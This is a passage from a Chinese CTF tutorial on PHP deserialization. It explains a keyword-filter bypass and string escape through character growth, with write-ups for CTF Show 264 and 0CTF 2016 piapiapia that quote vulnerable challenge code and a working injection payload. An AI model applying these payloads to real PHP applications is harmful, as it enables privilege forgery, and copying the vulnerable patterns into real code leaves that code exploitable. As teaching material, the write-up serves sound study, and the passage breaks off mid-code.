class="line">表示字符类型的s大写时，会被当成16进制解析。</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class <span class="built_in">test</span>&#123;</span><br><span class="line">    public <span class="variable">$username</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span>  <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="built_in">echo</span> 666;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> check(<span class="variable">$data</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$data</span>, <span class="string">&#x27;username&#x27;</span>)!==False)&#123;</span><br><span class="line">        <span class="built_in">echo</span>(<span class="string">&quot;你绕不过！！&quot;</span>.PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 未作处理前</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = check(<span class="variable">$a</span>);</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br><span class="line">// 做处理后 \75是u的16进制</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = check(<span class="variable">$a</span>);</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h3 id="1-6-5-引用"><a href="#1-6-5-引用" class="headerlink" title="1.6.5 引用"></a>1.6.5 引用</h3><p>测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__contruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = &amp;<span class="keyword">$this</span>-&gt;a; <span class="comment">// $b 是 $a 的引用,从而使a 与 b 永远相等</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;a === <span class="keyword">$this</span>-&gt;b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = serialize(nre test());</span><br></pre></td></tr></table></figure><h1 id="二、反序列化字符串逃逸"><a href="#二、反序列化字符串逃逸" class="headerlink" title="二、反序列化字符串逃逸"></a>二、反序列化字符串逃逸</h1><p>概述：反序列化的字符串逃逸，包括字符增加与字符减少两类。</p><h2 id="2-1-知识一："><a href="#2-1-知识一：" class="headerlink" title="2.1 知识一："></a>2.1 知识一：</h2><ul><li>PHP 反序列化时，对类中不存在的属性也会反序列化；</li><li>PHP 反序列化时，底层代码是以 <code>;</code>作为字段的分隔，以 <code>&#125;</code> 作为结尾(字符串除外)，并且是根据长度判断内容的；即当存在 <code>;&#125;</code> 与 <code>&#123;</code>  匹配时，不会再对 <code>;&#125;</code> 后面的字符串进行反序列化。</li></ul><p> <strong>简单理解一下</strong></p><p><img src="https://i.loli.net/2021/06/12/wOtFRIT7QracXNJ.png" alt="image-20210612153444877"></p><p><img src="https://i.loli.net/2021/06/12/yp5auIfPciTKWe3.png" alt="image-20210612153557488"></p><p>我们在序列化之后的字符串 <code>;&#125;</code> 后再加上一些内容，其仍可被正常解析，说明在 PHP 反序列时碰到 <code>;&#125;</code> 与前面的 <code>&#123;</code> 配对之后，就会停止反序列化。</p><h2 id="2-2-知识二："><a href="#2-2-知识二：" class="headerlink" title="2.2 知识二："></a>2.2 知识二：</h2><ul><li>当进行反序列化的字符串中长度与所描述的长度不同时，就会 <strong>报错</strong></li></ul><h2 id="2-3-字符增多-—-CTF-Show-264"><a href="#2-3-字符增多-—-CTF-Show-264" class="headerlink" title="2.3 字符增多 — CTF Show 264"></a>2.3 字符增多 — CTF Show 264</h2><p><a href="https://ctf.show/challenges#web264-724">题目链接</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># message.php：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># index.php:</span></span><br><span class="line">Your message has been sent <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=base64_encode(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><blockquote><ol><li>想要获取 flag，需要使 <code>$msg-&gt;token==&#39;admin&#39;</code> ，而默认 <code>public $token=&#39;user&#39;;</code></li><li>字符串逃逸：构造 以下内容</li></ol></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span> = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> message();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$msg</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure><blockquote><ol start="3"><li>更改 $to 的值</li></ol></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span> = <span class="string">&#x27;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> message();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$msg</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:28:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure><blockquote><ol start="4"><li>利用 <code>str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg))</code> 补充字符串长度；增加 27 个长度；</li></ol></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span> = <span class="string">&#x27;cfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> message();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$msg</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:136:&quot;cfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样被替换之后变成以下内容，正好补上 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:136:&quot;cloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><strong>payload：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=a&amp;m=b&amp;t=cfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>然后我们抓包，更改 cookie 即可</p><p><img src="https://i.loli.net/2021/06/12/yedxVQwtYGucfm3.png" alt="image-20210612211255566"></p><h2 id="2-4-字符增多-—-0CTF-2016-piapiapia"><a href="#2-4-字符增多-—-0CTF-2016-piapiapia" class="headerlink" title="2.4 字符增多 — [0CTF 2016]piapiapia"></a>2.4 字符增多 — [0CTF 2016]piapiapia</h2><p><a href="https://buuoj.cn/challenges#[0CTF%202016]piapiapia">题目链接</a></p><p><strong>分析：</strong></p><blockquote><ol><li>目录扫描 ，得到 <a href="http://www.zip,查看源码/">www.zip，查看源码</a></li></ol></blockquote><p><img src="https://i.loli.net/2021/06/12/duJgi58ZpxNOwQk.png" alt="image-20210612213229646"></p><blockquote><ol start="2"><li>register.php ，注册一下</li><li>注册成功之后，将跳转 index.php，进行登录</li><li>成功登录，跳转到 update.php，填写详细信息，可进行文件上传</li></ol></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># update.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$user-&gt;update_profile($username, serialize($profile));</code> 将填入的信息进行 序列化</p><blockquote><ol start="5"><li>它的上传文件的存储路径是 <code>$profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);</code> ，起不到 <code>.php</code> 或者是 <code>图片木马包含的作用</code>;</li><li>代码审计</li></ol></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># register.php</span></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$user</span>-&gt;is_exists(<span class="variable">$username</span>)) &#123;</span><br><span class="line"><span class="variable">$user</span>-&gt;register(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;User name Already Exists&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>注册成功，进入 index.php 进行下一步的登录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">header(<span 